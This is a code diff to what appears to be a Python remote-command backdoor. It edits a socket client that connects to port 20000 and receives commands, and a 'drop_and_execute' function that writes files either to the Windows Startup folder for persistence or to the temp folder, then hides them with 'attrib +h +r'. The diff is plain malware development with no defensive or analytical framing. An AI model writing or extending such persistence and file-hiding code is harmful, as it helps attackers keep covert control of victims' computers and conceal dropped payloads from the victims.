@@ -13,7 +13,6 @@ class Socket:
     def connect_to_server(self):
         try:
             self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.active_socket.settimeout(1)
             self.active_socket.connect((socket.gethostname(), 20000))
             Socket.established = True
             print("Connection established")
@@ -24,7 +23,7 @@ class Socket:
     def receive_command(self):
         try:
             cmd = self.active_socket.recv(1024)
-        except (ConnectionResetError, ConnectionRefusedError, TimeoutError, socket.timeout):
+        except (ConnectionResetError, ConnectionRefusedError, TimeoutError):
             self.established = False
             return False
 
@@ -98,7 +97,10 @@ def drop_and_execute(script, execute_file=False, startup=False, low_protect=Fals
 
     # Hide File by calling Windows command
     if low_protect:
-        chdir("C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
+        if startup:
+            chdir("C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
+        else:
+            chdir(getenv("temp"))
         system("attrib +h +r " + file_name)
 
 
